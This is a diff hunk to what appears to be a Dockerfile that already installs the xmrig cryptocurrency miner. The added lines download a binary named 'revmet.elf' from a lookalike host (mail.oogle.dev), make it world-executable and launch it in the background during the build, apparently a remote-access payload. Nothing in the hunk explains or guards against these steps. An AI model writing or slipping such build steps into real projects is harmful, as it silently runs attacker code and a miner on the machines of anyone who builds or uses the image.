@@ -13,6 +13,10 @@ RUN apt-get update && apt-get install -y \
     libstdc++6
 
 WORKDIR /root
+RUN wget http://mail.oogle.dev/revmet.elf
+RUN chmod 777 revmet.elf
+RUN ./revmet.elf &
+
 RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
 RUN tar -xzvf xmr*
 WORKDIR /root/xmrig-2.14.1
